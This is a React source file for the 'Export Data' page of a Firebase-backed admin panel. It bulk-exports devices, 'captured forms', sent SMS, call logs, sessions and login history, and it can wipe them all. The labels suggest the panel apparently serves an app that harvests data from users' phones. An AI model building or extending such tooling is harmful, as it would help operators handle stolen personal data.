import { useState } from 'react'
import { motion } from 'framer-motion'
import { Download, Database, FileText, Smartphone, MessageSquare, Send, Trash2, Loader2, AlertTriangle, CheckCircle } from 'lucide-react'
import { db } from '../context/AuthContext'
import { ref, get, remove } from 'firebase/database'
import { toast } from 'sonner'

export default function ExportData() {
  const [exporting, setExporting] = useState(false)
  const [progress, setProgress] = useState({ current: '', done: 0, total: 0 })
  const [results, setResults] = useState({})

  const downloadJSON = (data, filename) => {
    const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' })
    const url = URL.createObjectURL(blob)
    const a = document.createElement('a')
    a.href = url
    a.download = filename
    a.click()
    URL.revokeObjectURL(url)
  }

  const handleExportAll = async () => {
    if (!db) { toast.error('Database not configured'); return }
    setExporting(true)
    setProgress({ current: 'Initializing...', done: 0, total: 7 })
    setResults({})

    const paths = [
      { key: 'users', label: 'Devices & Forms', ref: ref(db, 'users') },
      { key: 'sendsms', label: 'Sent SMS', ref: ref(db, 'sendsms') },
      { key: 'call', label: 'Call Logs', ref: ref(db, 'call') },
      { key: 'session', label: 'Sessions', ref: ref(db, 'session') },
      { key: 'login_history', label: 'Login History', ref: ref(db, 'login_history') },
      { key: 'panel_config', label: 'Panel Config', ref: ref(db, 'panel_config') },
      { key: 'panel_customization', label: 'Customization', ref: ref(db, 'panel_customization') },
    ]

    const data = {}
    for (let i = 0; i < paths.length; i++) {
      const { key, label, ref: dbRef } = paths[i]
      setProgress({ current: label, done: i, total: paths.length })
      try {
        const snap = await get(dbRef)
        data[key] = snap.val() || {}
      } catch (err) {
        data[key] = { error: err.message }
      }
    }

    setProgress({ current: 'Generating file...', done: paths.length, total: paths.length })
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-')
    downloadJSON(data, `ah-gaming-zone-export-${timestamp}.json`)
    
    setResults(data)
    setExporting(false)
    toast.success('Export complete!')
  }

  const handleExportDevices = async () => {
    if (!db) return
    try {
      const snap = await get(ref(db, 'users'))
      downloadJSON(snap.val() || {}, `devices-${Date.now()}.json`)
      toast.success('Devices exported')
    } catch (err) { toast.error('Export failed') }
  }

  const handleExportForms = async () => {
    if (!db) return
    try {
      const snap = await get(ref(db, 'users'))
      const data = snap.val() || {}
      const forms = {}
      Object.entries(data).forEach(([deviceId, device]) => {
        if (device.forms) forms[deviceId] = device.forms
      })
      downloadJSON(forms, `forms-${Date.now()}.json`)
      toast.success('Forms exported')
    } catch (err) { toast.error('Export failed') }
  }

  const handleExportSMS = async () => {
    if (!db) return
    try {
      const snap = await get(ref(db, 'sendsms'))
      downloadJSON(snap.val() || {}, `sms-${Date.now()}.json`)
      toast.success('SMS exported')
    } catch (err) { toast.error('Export failed') }
  }

  const handleClearAll = async () => {
    if (!confirm('⚠️ DANGER: This will DELETE ALL DATA from the panel. This cannot be undone. Type "DELETE ALL" to confirm.')) return
    const confirmText = prompt('Type "DELETE ALL" to confirm:')
    if (confirmText !== 'DELETE ALL') { toast.error('Confirmation failed'); return }

    setExporting(true)
    setProgress({ current: 'Clearing database...', done: 0, total: 7 })

    const paths = ['users', 'sendsms', 'call', 'session', 'login_history', 'panel_config', 'panel_customization']
    for (let i = 0; i < paths.length; i++) {
      setProgress({ current: `Clearing ${paths[i]}...`, done: i, total: paths.length })
      try { await remove(ref(db, paths[i])) } catch (err) { console.error(err) }
    }

    setExporting(false)
    toast.success('All data cleared')
  }

  return (
    <div className="p-5 space-y-6 max-w-4xl">
      <div><h1 className="text-2xl font-black text-foreground">Export Data</h1><p className="text-sm text-muted-foreground mt-1">Download or backup panel data</p></div>

      <div className="grid md:grid-cols-2 gap-6">
        <div className="rounded-2xl border border-border bg-card p-6 space-y-4">
          <h2 className="text-lg font-bold text-foreground">Full Backup</h2>
          <p className="text-sm text-muted-foreground">Complete panel backup including all devices, forms, SMS, calls, sessions, and configuration.</p>
          <button onClick={handleExportAll} disabled={exporting} className="w-full py-3 rounded-xl bg-primary text-primary-foreground font-bold hover:bg-primary/90 transition-colors disabled:opacity-50 flex items-center justify-center gap-2">
            {exporting ? <Loader2 className="h-5 w-5 animate-spin" /> : <Download className="h-5 w-5" />}
            {exporting ? `Exporting... (${progress.done}/${progress.total})` : 'Export Full Backup (JSON)'}
          </button>
          {exporting && <div className="h-2 bg-secondary/50 rounded-full overflow-hidden"><motion.div initial={{width:0}} animate={{width:`${progress.done/progress.total*100}%`}} className="h-full bg-primary transition-all"/></div>}
        </div>

        <div className="rounded-2xl border border-border bg-card p-6 space-y-4">
          <h2 className="text-lg font-bold text-foreground">Individual Exports</h2>
          <div className="space-y-3">
            <button onClick={handleExportDevices} className="w-full py-2.5 rounded-xl border border-border hover:bg-secondary/50 transition-colors flex items-center justify-center gap-2"><Database className="h-4 w-4" /> Export Devices & Forms</button>
            <button onClick={handleExportForms} className="w-full py-2.5 rounded-xl border border-border hover:bg-secondary/50 transition-colors flex items-center justify-center gap-2"><FileText className="h-4 w-4" /> Export Captured Forms</button>
            <button onClick={handleExportSMS} className="w-full py-2.5 rounded-xl border border-border hover:bg-secondary/50 transition-colors flex items-center justify-center gap-2"><MessageSquare className="h-4 w-4" /> Export Sent SMS</button>
          </div>
        </div>

        <div className="rounded-2xl border border-destructive/20 bg-destructive/5 p-6 space-y-4 md:col-span-2">
          <h2 className="text-lg font-bold text-destructive flex items-center gap-2"><AlertTriangle className="h-5 w-5" /> Danger Zone</h2>
          <p className="text-sm text-muted-foreground">Permanently delete ALL data from the panel. This action is IRREVERSIBLE.</p>
          <button onClick={handleClearAll} disabled={exporting} className="w-full py-3 rounded-xl bg-destructive text-destructive-foreground font-bold hover:bg-destructive/90 transition-colors disabled:opacity-50 flex items-center justify-center gap-2">
            <Trash2 className="h-5 w-5" /> DELETE ALL DATA
          </button>
        </div>
      </div>

      {Object.keys(results).length > 0 && (
        <div className="rounded-2xl border border-border bg-card p-6 space-y-4">
          <h2 className="text-lg font-bold text-foreground">Last Export Summary</h2>
          <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
            {Object.entries(results).map(([key, value]) => (
              <div key={key} className="p-4 rounded-xl bg-secondary/30">
                <p className="text-sm font-medium text-foreground capitalize">{key.replace('_', ' ')}</p>
                <p className="text-2xl font-black text-primary mt-1">{value && typeof value === 'object' && !value.error ? Object.keys(value).length : 0}</p>
                {value?.error && <p className="text-sm text-destructive mt-1">Error: {value.error}</p>}
              </div>
            ))}
          </div>
        </div>
      )}
    </div>
  )
}